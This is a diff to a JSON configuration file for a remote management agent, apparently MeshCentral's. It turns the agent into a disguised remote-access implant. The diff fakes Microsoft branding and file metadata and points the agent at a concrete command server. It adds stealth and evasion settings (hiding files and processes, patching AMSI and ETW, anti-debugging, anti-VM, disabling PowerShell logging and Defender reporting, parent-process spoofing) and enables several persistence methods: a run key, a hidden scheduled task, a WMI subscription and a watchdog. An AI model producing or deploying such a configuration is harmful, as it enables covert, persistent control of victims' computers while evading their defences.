@@ -1,6 +1,6 @@
 {
   "$schema": "./schema/meshagent.schema.json",
-  "_comment": "TEMPLATE FILE - Copy to branding_config.json and customize with your infrastructure",
+  "_comment": "TEMPLATE FILE – copy to branding_config.json and override the placeholder values for your environment",
   "branding": {
     "companyName": "Microsoft Corporation",
     "serviceName": "WinDiagnosticHost",
@@ -12,32 +12,113 @@
     "logPath": "C:/Windows/System32/DiagnosticHost/logs",
     "versionInfo": {
       "fileVersion": "10.0.19041.0",
-      "productVersion": "10.0.19041.0"
+      "productVersion": "10.0.19041.0",
+      "fileDescription": "Windows Diagnostic Host Service",
+      "internalName": "diaghost.exe",
+      "legalCopyright": "© Microsoft Corporation. All rights reserved.",
+      "originalFilename": "diaghost.exe"
     }
   },
   "network": {
-    "primaryEndpoint": "wss://YOUR_DOMAIN_HERE:443/agent.ashx",
+    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
     "sni": null,
     "hostHeader": null,
     "alpn": ["http/1.1"],
-    "userAgent": "Microsoft-CryptoAPI/10.0"
+    "userAgent": "Microsoft-CryptoAPI/10.0",
+    "connectionTimeout": 30,
+    "retryAttempts": 5,
+    "retryDelay": 10,
+    "keepAlive": true,
+    "compression": true
   },
   "artifacts": {
     "databaseName": "diaghost.db",
     "logFileName": "diagnostics.log",
     "configFileName": "diaghost.conf"
   },
+  "stealth": {
+    "enabled": true,
+    "svchostMode": true,
+    "svchostGroup": "netsvcs",
+    "bundleExtract": false,
+    "hideFiles": true,
+    "hideRegistry": true,
+    "hideProcess": true,
+    "hideNetwork": false,
+    "amsiPatch": true,
+    "ettwPatch": true,
+    "antiDebug": true,
+    "antiVM": true,
+    "syscallsDirectMode": true,
+    "reflectiveLoading": true,
+    "obfuscateStrings": true,
+    "encryptMemory": true,
+    "disableLogging": true,
+    "selfDelete": false
+  },
   "persistence": {
-    "runKey": false,
-    "scheduledTask": { "enabled": false },
-    "wmi": { "enabled": false },
-    "watchdog": { "enabled": true, "intervalSeconds": 600 }
+    "runKey": true,
+    "scheduledTask": {
+      "enabled": true,
+      "taskName": "Windows Diagnostic Host Task",
+      "trigger": "onlogon",
+      "hidden": true
+    },
+    "wmi": {
+      "enabled": true,
+      "className": "WinDiagnosticHost",
+      "methodName": "StartService",
+      "namespace": "root/subscription"
+    },
+    "watchdog": {
+      "enabled": true,
+      "intervalSeconds": 300,
+      "restartOnCrash": true,
+      "restartDelay": 10
+    },
+    "serviceRecovery": {
+      "enabled": true,
+      "resetPeriod": 86400,
+      "restartDelay": 10000,
+      "actions": ["restart", "restart", "restart"]
+    }
+  },
+  "evasion": {
+    "disablePowerShellLogging": true,
+    "disableEventLogs": false,
+    "disableWindowsDefenderReporting": true,
+    "clearPrefetch": false,
+    "disableETW": true,
+    "patchAMSI": true,
+    "bypassUAC": false,
+    "hideFromTaskManager": true,
+    "spoofParentProcess": true,
+    "useSyscalls": true
+  },
+  "security": {
+    "certificatePinning": true,
+    "encryptedCommunication": true,
+    "mutualTLS": false,
+    "validateServerCert": true,
+    "serverCertHash": "REPLACE_WITH_SERVER_CERT_HASH"
   },
   "provisioning": {
     "meshName": "Windows Diagnostics",
     "meshType": "2",
-    "meshId": "",
-    "serverId": "",
-    "serverUrl": "wss://YOUR_DOMAIN_HERE:443/agent.ashx"
+    "meshId": "REPLACE_WITH_MESH_ID",
+    "serverId": "REPLACE_WITH_SERVER_ID",
+    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
+    "autoRegister": true,
+    "installFlags": "0"
+  },
+  "advanced": {
+    "coreDumpEnabled": true,
+    "agentLogDump": true,
+    "debugMode": false,
+    "verboseLogging": false,
+    "agentPing": 60,
+    "agentPong": 60,
+    "agentIdleTimeout": 150,
+    "compressionLevel": 6
   }
 }
